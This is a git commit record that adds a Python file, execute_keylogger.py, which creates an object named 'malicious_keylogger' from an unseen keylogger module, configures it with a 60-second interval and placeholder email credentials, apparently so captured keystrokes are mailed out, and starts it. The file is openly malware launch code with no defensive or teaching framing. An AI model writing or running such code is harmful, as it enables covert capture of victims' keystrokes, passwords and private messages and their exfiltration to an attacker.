dac203f4a4654ff061db4529fb4d7a20491474cf
Sukanya12345-tech <63970614+Sukanya12345-tech@users.noreply.github.com>
2020-11-09 19:38:13 +0530

    Add files via upload

---
+++ execute_keylogger.py
@@ -0,0 +1,14 @@
+#!/usr/bin/env python
+
+import keylogger
+
+
+# Initialize / create keylogger
+import keylogger
+
+
+malicious_keylogger: keylogger.KeyLogger = keylogger.KeyLogger(60, 'your_mail_id@gmail.com', 'mail_password')
+
+# Execute Keylogger
+
+malicious_keylogger.start()
